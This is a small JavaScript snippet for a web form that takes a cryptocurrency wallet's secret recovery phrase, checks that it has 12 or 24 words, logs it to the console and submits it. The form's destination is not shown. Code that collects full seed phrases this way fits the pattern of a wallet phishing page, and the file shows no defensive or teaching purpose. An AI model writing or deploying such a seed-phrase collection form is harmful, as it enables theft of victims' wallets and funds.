document.addEventListener("DOMContentLoaded", () => {
  document.querySelector("#submit-form").addEventListener("submit", (e) => {
    e.preventDefault();

    const rec = e.target.querySelector("#sec-rec-phr");
    console.log(rec.value);

    const wordCount = rec.value.split(/\s+/).length;
    console.log(wordCount);

    if (wordCount == 12 || wordCount == 24) {
      e.target.submit();
    }
    // if (wordCount == 12 || wordCount == 24) {
    //   console.log("The value of the textarea is valid: " + textAreaValue);
    //   try {
    //     // e.target.querySelector("textarea").value = ``;
    //     e.target.submit();
    //   } catch (error) {}
    // } else {
    //   console.log(
    //     "The value of the textarea must contain either 12 or 24 words."
    //   );

    //   alert("");
    //   //   const errMsg = document.createElement("span");
    //   //   errMsg.className = `text-red text-xs text-center mt-2 py-2`;
    //   //   errMsg.textContent = `Invalid Seed Phrase.`;

    //   //   e.target.insertBefore(errMsg, e.target.querySelector("#sig-go"));
    //   //   document.querySelector("#phrase-form").appendChild(errMsg);
    // }
  });
});
